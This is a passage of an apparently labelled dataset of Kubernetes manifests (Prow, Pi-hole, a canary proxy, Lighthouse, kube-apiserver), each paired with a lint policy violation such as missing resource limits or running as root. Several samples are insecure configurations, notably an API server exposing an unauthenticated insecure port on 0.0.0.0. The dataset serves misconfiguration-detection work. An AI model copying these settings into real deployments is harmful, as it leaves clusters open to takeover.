    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "03625",
    "manifest_path": "data/manifests/the_stack_sample/sample_1605.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220203-c2195422bf\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "03626",
    "manifest_path": "data/manifests/the_stack_sample/sample_1606.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: ServerIP\n          value: 192.168.1.100\n        - name: WEBPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pihole\n              key: ADMIN_PASSWORD\n        image: pihole/pihole\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 80\n          name: pihole\n          protocol: TCP\n        - containerPort: 53\n          name: dns\n          protocol: TCP\n        - containerPort: 53\n          name: dns-udp\n          protocol: UDP\n        - containerPort: 443\n          name: pihole-ssl\n          protocol: TCP\n        - containerPort: 67\n          name: client-udp\n          protocol: UDP\n        volumeMounts:\n        - mountPath: /etc/pihole\n          name: config\n        - mountPath: /etc/dnsmasq.d/02-custom.conf\n          name: custom-dnsmasq\n          subPath: 02-custom.conf\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: pihole-pvc\n      - configMap:\n          defaultMode: 420\n          name: pihole-custom-dnsmasq\n        name: custom-dnsmasq\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pihole\" is using an invalid container image, \"pihole/pihole\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03627",
    "manifest_path": "data/manifests/the_stack_sample/sample_1606.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: ServerIP\n          value: 192.168.1.100\n        - name: WEBPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pihole\n              key: ADMIN_PASSWORD\n        image: pihole/pihole\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 80\n          name: pihole\n          protocol: TCP\n        - containerPort: 53\n          name: dns\n          protocol: TCP\n        - containerPort: 53\n          name: dns-udp\n          protocol: UDP\n        - containerPort: 443\n          name: pihole-ssl\n          protocol: TCP\n        - containerPort: 67\n          name: client-udp\n          protocol: UDP\n        volumeMounts:\n        - mountPath: /etc/pihole\n          name: config\n        - mountPath: /etc/dnsmasq.d/02-custom.conf\n          name: custom-dnsmasq\n          subPath: 02-custom.conf\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: pihole-pvc\n      - configMap:\n          defaultMode: 420\n          name: pihole-custom-dnsmasq\n        name: custom-dnsmasq\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pihole\" does not have a read-only root file system"
  },
  {
    "id": "03628",
    "manifest_path": "data/manifests/the_stack_sample/sample_1606.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: ServerIP\n          value: 192.168.1.100\n        - name: WEBPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pihole\n              key: ADMIN_PASSWORD\n        image: pihole/pihole\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 80\n          name: pihole\n          protocol: TCP\n        - containerPort: 53\n          name: dns\n          protocol: TCP\n        - containerPort: 53\n          name: dns-udp\n          protocol: UDP\n        - containerPort: 443\n          name: pihole-ssl\n          protocol: TCP\n        - containerPort: 67\n          name: client-udp\n          protocol: UDP\n        volumeMounts:\n        - mountPath: /etc/pihole\n          name: config\n        - mountPath: /etc/dnsmasq.d/02-custom.conf\n          name: custom-dnsmasq\n          subPath: 02-custom.conf\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: pihole-pvc\n      - configMap:\n          defaultMode: 420\n          name: pihole-custom-dnsmasq\n        name: custom-dnsmasq\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pihole\" is not set to runAsNonRoot"
  },
  {
    "id": "03629",
    "manifest_path": "data/manifests/the_stack_sample/sample_1606.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: ServerIP\n          value: 192.168.1.100\n        - name: WEBPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pihole\n              key: ADMIN_PASSWORD\n        image: pihole/pihole\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 80\n          name: pihole\n          protocol: TCP\n        - containerPort: 53\n          name: dns\n          protocol: TCP\n        - containerPort: 53\n          name: dns-udp\n          protocol: UDP\n        - containerPort: 443\n          name: pihole-ssl\n          protocol: TCP\n        - containerPort: 67\n          name: client-udp\n          protocol: UDP\n        volumeMounts:\n        - mountPath: /etc/pihole\n          name: config\n        - mountPath: /etc/dnsmasq.d/02-custom.conf\n          name: custom-dnsmasq\n          subPath: 02-custom.conf\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: pihole-pvc\n      - configMap:\n          defaultMode: 420\n          name: pihole-custom-dnsmasq\n        name: custom-dnsmasq\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pihole\" has cpu request 0"
  },
  {
    "id": "03630",
    "manifest_path": "data/manifests/the_stack_sample/sample_1606.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: ServerIP\n          value: 192.168.1.100\n        - name: WEBPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pihole\n              key: ADMIN_PASSWORD\n        image: pihole/pihole\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 80\n          name: pihole\n          protocol: TCP\n        - containerPort: 53\n          name: dns\n          protocol: TCP\n        - containerPort: 53\n          name: dns-udp\n          protocol: UDP\n        - containerPort: 443\n          name: pihole-ssl\n          protocol: TCP\n        - containerPort: 67\n          name: client-udp\n          protocol: UDP\n        volumeMounts:\n        - mountPath: /etc/pihole\n          name: config\n        - mountPath: /etc/dnsmasq.d/02-custom.conf\n          name: custom-dnsmasq\n          subPath: 02-custom.conf\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: pihole-pvc\n      - configMap:\n          defaultMode: 420\n          name: pihole-custom-dnsmasq\n        name: custom-dnsmasq\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pihole\" has memory limit 0"
  },
  {
    "id": "03631",
    "manifest_path": "data/manifests/the_stack_sample/sample_1607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: proxy-deployment-canary\n  labels:\n    app: proxy-canary\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: proxy-canary\n  template:\n    metadata:\n      labels:\n        app: proxy-canary\n    spec:\n      containers:\n      - name: proxy-canary\n        image: gcr.io/GCP_PROJECT/IMAGE_NAME:bazel\n        ports:\n        - containerPort: 30000\n          name: health-check\n        - containerPort: 30001\n          name: whois\n        - containerPort: 30002\n          name: epp\n        - containerPort: 30010\n          name: http-whois\n        - containerPort: 30011\n          name: https-whois\n        readinessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n        args:\n        - --env\n        - sandbox_canary\n        - --log\n        env:\n        - name: POD_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTAINER_NAME\n          value: proxy-canary\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"proxy-canary\" does not have a read-only root file system"
  },
  {
    "id": "03632",
    "manifest_path": "data/manifests/the_stack_sample/sample_1607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: proxy-deployment-canary\n  labels:\n    app: proxy-canary\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: proxy-canary\n  template:\n    metadata:\n      labels:\n        app: proxy-canary\n    spec:\n      containers:\n      - name: proxy-canary\n        image: gcr.io/GCP_PROJECT/IMAGE_NAME:bazel\n        ports:\n        - containerPort: 30000\n          name: health-check\n        - containerPort: 30001\n          name: whois\n        - containerPort: 30002\n          name: epp\n        - containerPort: 30010\n          name: http-whois\n        - containerPort: 30011\n          name: https-whois\n        readinessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n        args:\n        - --env\n        - sandbox_canary\n        - --log\n        env:\n        - name: POD_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTAINER_NAME\n          value: proxy-canary\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"proxy-canary\" is not set to runAsNonRoot"
  },
  {
    "id": "03633",
    "manifest_path": "data/manifests/the_stack_sample/sample_1607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: proxy-deployment-canary\n  labels:\n    app: proxy-canary\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: proxy-canary\n  template:\n    metadata:\n      labels:\n        app: proxy-canary\n    spec:\n      containers:\n      - name: proxy-canary\n        image: gcr.io/GCP_PROJECT/IMAGE_NAME:bazel\n        ports:\n        - containerPort: 30000\n          name: health-check\n        - containerPort: 30001\n          name: whois\n        - containerPort: 30002\n          name: epp\n        - containerPort: 30010\n          name: http-whois\n        - containerPort: 30011\n          name: https-whois\n        readinessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n        args:\n        - --env\n        - sandbox_canary\n        - --log\n        env:\n        - name: POD_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTAINER_NAME\n          value: proxy-canary\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"proxy-canary\" has cpu request 0"
  },
  {
    "id": "03634",
    "manifest_path": "data/manifests/the_stack_sample/sample_1607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: proxy-deployment-canary\n  labels:\n    app: proxy-canary\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: proxy-canary\n  template:\n    metadata:\n      labels:\n        app: proxy-canary\n    spec:\n      containers:\n      - name: proxy-canary\n        image: gcr.io/GCP_PROJECT/IMAGE_NAME:bazel\n        ports:\n        - containerPort: 30000\n          name: health-check\n        - containerPort: 30001\n          name: whois\n        - containerPort: 30002\n          name: epp\n        - containerPort: 30010\n          name: http-whois\n        - containerPort: 30011\n          name: https-whois\n        readinessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          tcpSocket:\n            port: health-check\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n        args:\n        - --env\n        - sandbox_canary\n        - --log\n        env:\n        - name: POD_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTAINER_NAME\n          value: proxy-canary\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"proxy-canary\" has memory limit 0"
  },
  {
    "id": "03635",
    "manifest_path": "data/manifests/the_stack_sample/sample_1609.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.1.38\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: ffe957e0de307ee6ef1778ba06a6b8d84591e23040e3e9cd38b5b063ff9194e3\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: ghcr.io/jenkins-x/lighthouse-keeper:1.1.38\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: bvboca\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.38\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: enable\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-keeper\" does not have a read-only root file system"
  },
  {
    "id": "03636",
    "manifest_path": "data/manifests/the_stack_sample/sample_1609.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.1.38\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: ffe957e0de307ee6ef1778ba06a6b8d84591e23040e3e9cd38b5b063ff9194e3\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: ghcr.io/jenkins-x/lighthouse-keeper:1.1.38\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: bvboca\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.38\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: enable\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-keeper\" is not set to runAsNonRoot"
  },
  {
    "id": "03637",
    "manifest_path": "data/manifests/the_stack_sample/sample_1610.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v${k8s_ver}_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --apiserver-count=${api_server_count}\n    - --etcd-servers=${etcd_endpoints}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=10.21.0.0/16\n    - --secure-port=443\n    - --insecure-port=8080\n    - --insecure-bind-address=0.0.0.0\n    - --audit-log-maxage=30\n    - --audit-log-maxsize=100\n    - --audit-log-path=/var/log/apiserver/audit.log\n    - --feature-gates=AdvancedAuditing=false\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota,Initializers\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --runtime-config=batch/v2alpha1,extensions/v1beta1=true,extensions/v1beta1/networkpolicies=true,admissionregistration.k8s.io/v1alpha1=true\n    - --anonymous-auth=false\n    - --authorization-mode=RBAC\n    - --etcd-quorum-read=true\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/apiserver.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/apiserver-key.pem\n    - --token-auth-file=/etc/kubernetes/ssl/token_auth.csv\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/auth\n      name: auth-kubernetes\n      readOnly: true\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n    - mountPath: /var/log/apiserver\n      name: apiserver-logs\n      readOnly: false\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/auth\n    name: auth-kubernetes\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /etc/ssl/certs\n    name: ssl-certs-host\n  - hostPath:\n      path: /var/log/apiserver\n    name: apiserver-logs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-apiserver\" does not have a read-only root file system"
  },
  {
    "id": "03638",
    "manifest_path": "data/manifests/the_stack_sample/sample_1610.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v${k8s_ver}_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --apiserver-count=${api_server_count}\n    - --etcd-servers=${etcd_endpoints}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=10.21.0.0/16\n    - --secure-port=443\n    - --insecure-port=8080\n    - --insecure-bind-address=0.0.0.0\n    - --audit-log-maxage=30\n    - --audit-log-maxsize=100\n    - --audit-log-path=/var/log/apiserver/audit.log\n    - --feature-gates=AdvancedAuditing=false\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota,Initializers\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --runtime-config=batch/v2alpha1,extensions/v1beta1=true,extensions/v1beta1/networkpolicies=true,admissionregistration.k8s.io/v1alpha1=true\n    - --anonymous-auth=false\n    - --authorization-mode=RBAC\n    - --etcd-quorum-read=true\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/apiserver.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/apiserver-key.pem\n    - --token-auth-file=/etc/kubernetes/ssl/token_auth.csv\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/auth\n      name: auth-kubernetes\n      readOnly: true\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n    - mountPath: /var/log/apiserver\n      name: apiserver-logs\n      readOnly: false\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/auth\n    name: auth-kubernetes\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /etc/ssl/certs\n    name: ssl-certs-host\n  - hostPath:\n      path: /var/log/apiserver\n    name: apiserver-logs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-apiserver\" is not set to runAsNonRoot"
  },
  {
    "id": "03639",
    "manifest_path": "data/manifests/the_stack_sample/sample_1610.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v${k8s_ver}_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --apiserver-count=${api_server_count}\n    - --etcd-servers=${etcd_endpoints}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=10.21.0.0/16\n    - --secure-port=443\n    - --insecure-port=8080\n    - --insecure-bind-address=0.0.0.0\n    - --audit-log-maxage=30\n    - --audit-log-maxsize=100\n    - --audit-log-path=/var/log/apiserver/audit.log\n    - --feature-gates=AdvancedAuditing=false\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota,Initializers\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --runtime-config=batch/v2alpha1,extensions/v1beta1=true,extensions/v1beta1/networkpolicies=true,admissionregistration.k8s.io/v1alpha1=true\n    - --anonymous-auth=false\n    - --authorization-mode=RBAC\n    - --etcd-quorum-read=true\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/apiserver.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/apiserver-key.pem\n    - --token-auth-file=/etc/kubernetes/ssl/token_auth.csv\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/auth\n      name: auth-kubernetes\n      readOnly: true\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n    - mountPath: /var/log/apiserver\n      name: apiserver-logs\n      readOnly: false\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/auth\n    name: auth-kubernetes\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /etc/ssl/certs\n    name: ssl-certs-host\n  - hostPath:\n      path: /var/log/apiserver\n    name: apiserver-logs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-apiserver\" has cpu request 0"
  },
  {
    "id": "03640",
    "manifest_path": "data/manifests/the_stack_sample/sample_1610.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: quay.io/coreos/hyperkube:v${k8s_ver}_coreos.0\n    command:\n    - /hyperkube\n    - apiserver\n    - --apiserver-count=${api_server_count}\n    - --etcd-servers=${etcd_endpoints}\n    - --allow-privileged=true\n    - --service-cluster-ip-range=10.21.0.0/16\n    - --secure-port=443\n    - --insecure-port=8080\n    - --insecure-bind-address=0.0.0.0\n    - --audit-log-maxage=30\n    - --audit-log-maxsize=100\n    - --audit-log-path=/var/log/apiserver/audit.log\n    - --feature-gates=AdvancedAuditing=false\n    - --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota,Initializers\n    - --tls-cert-file=/etc/kubernetes/ssl/apiserver.pem\n    - --tls-private-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --client-ca-file=/etc/kubernetes/ssl/ca.pem\n    - --service-account-key-file=/etc/kubernetes/ssl/apiserver-key.pem\n    - --runtime-config=batch/v2alpha1,extensions/v1beta1=true,extensions/v1beta1/networkpolicies=true,admissionregistration.k8s.io/v1alpha1=true\n    - --anonymous-auth=false\n    - --authorization-mode=RBAC\n    - --etcd-quorum-read=true\n    - --kubelet-client-certificate=/etc/kubernetes/ssl/apiserver.pem\n    - --kubelet-client-key=/etc/kubernetes/ssl/apiserver-key.pem\n    - --token-auth-file=/etc/kubernetes/ssl/token_auth.csv\n    ports:\n    - containerPort: 443\n      hostPort: 443\n      name: https\n    - containerPort: 8080\n      hostPort: 8080\n      name: local\n    volumeMounts:\n    - mountPath: /etc/kubernetes/auth\n      name: auth-kubernetes\n      readOnly: true\n    - mountPath: /etc/kubernetes/ssl\n      name: ssl-certs-kubernetes\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: ssl-certs-host\n      readOnly: true\n    - mountPath: /var/log/apiserver\n      name: apiserver-logs\n      readOnly: false\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/auth\n    name: auth-kubernetes\n  - hostPath:\n      path: /etc/kubernetes/ssl\n    name: ssl-certs-kubernetes\n  - hostPath:\n      path: /etc/ssl/certs\n    name: ssl-certs-host\n  - hostPath:\n      path: /var/log/apiserver\n    name: apiserver-logs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-apiserver\" has memory limit 0"
  },
  {
    "id": "03641",
    "manifest_path": "data/manifests/the_stack_sample/sample_1611.yaml",
